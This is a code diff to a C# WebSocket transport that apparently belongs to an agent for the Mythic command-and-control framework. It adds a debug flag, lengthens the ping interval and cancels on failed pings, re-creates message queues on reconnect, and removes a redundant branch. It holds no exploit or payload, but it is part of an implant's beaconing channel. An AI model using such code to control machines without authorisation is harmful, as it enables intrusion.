@@ -42,14 +42,18 @@ namespace WebsocketTransport
         private ST.Task agentProcessorTask = null;
         private ST.Task agentPingTask = null;
         private static JsonSerializer jsonSerializer = new JsonSerializer();
-        private static AutoResetEvent senderEvent = new AutoResetEvent(false);
-        private static ConcurrentQueue<IMythicMessage> receiverQueue = new ConcurrentQueue<IMythicMessage>();
-        private static AutoResetEvent receiverEvent = new AutoResetEvent(false);
+        private static AutoResetEvent senderEvent;
+        private static ConcurrentQueue<IMythicMessage> receiverQueue;
+        private static AutoResetEvent receiverEvent;
         private Action sendAction;
         private Dictionary<WebSocket, ST.Task> writerTasks = new Dictionary<WebSocket, ST.Task>();
         private string Uuid = "";
         private CancellationTokenSource cancellationTokenSource;
+#if DEBUG
+        private bool Debug = true;
+#else
         private bool Debug = false;
+#endif
 
         public WebsocketProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
         {
@@ -107,6 +111,7 @@ namespace WebsocketTransport
                     {
                         if (Client.IsAlive)
                         {
+                            DebugPrint("Sending message");
                             Client.Send(result);
                         }
                     }
@@ -131,8 +136,11 @@ namespace WebsocketTransport
             {
                 while (Client.IsAlive && Agent.IsAlive() && !cancellationTokenSource.Token.IsCancellationRequested)
                 {
-                    Client.Ping();
-                    Thread.Sleep(1000);
+                    if (!Client.Ping())
+                    {
+                        cancellationTokenSource.Cancel();
+                    }
+                    Thread.Sleep(5000);
                 }
             }, cancellationTokenSource.Token);
 
@@ -201,9 +209,12 @@ namespace WebsocketTransport
                 {
                     if (!cancellationTokenSource.Token.IsCancellationRequested)
                     {
-                        Client.Ping();
+                        if (!Client.Ping())
+                        {
+                            cancellationTokenSource.Cancel();
+                        }
                     }
-                    Thread.Sleep(1000);
+                    Thread.Sleep(5000);
                 }
             }, cancellationTokenSource.Token);
 
@@ -258,8 +269,11 @@ namespace WebsocketTransport
         {
             while (Agent.IsAlive() && Client.IsAlive)
             {
-                DebugPrint("Waiting to receive message...");
-                receiverEvent.WaitOne(Timeout.Infinite, cancellationTokenSource.Token.IsCancellationRequested);
+                if (receiverQueue.Count == 0)
+                {
+                    receiverEvent.WaitOne(Timeout.Infinite, cancellationTokenSource.Token.IsCancellationRequested);
+                }
+
                 IMythicMessage msg = receiverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                 if (msg != null)
                 {
@@ -290,6 +304,10 @@ namespace WebsocketTransport
         {
             DebugPrint("Connecting...");
             cancellationTokenSource = new CancellationTokenSource();
+            receiverQueue = new ConcurrentQueue<IMythicMessage>();
+            receiverEvent = new AutoResetEvent(false);
+            senderEvent = new AutoResetEvent(false);
+
             Client = new WebSocket(Endpoint + PostUri);
             Client.WaitTime = TimeSpan.FromHours(8);
 
@@ -387,14 +405,8 @@ namespace WebsocketTransport
                 data = "",
                 tag = String.Empty
             };
-            if (_keyExchanged)
-            {
-                m.data = Serializer.Serialize(msg);
-            }
-            else
-            {
-                m.data = Serializer.Serialize(msg);
-            }
+            
+            m.data = Serializer.Serialize(msg);
             string message = jsonSerializer.Serialize(m);
             senderQueue.Enqueue(Encoding.UTF8.GetBytes(message));
 
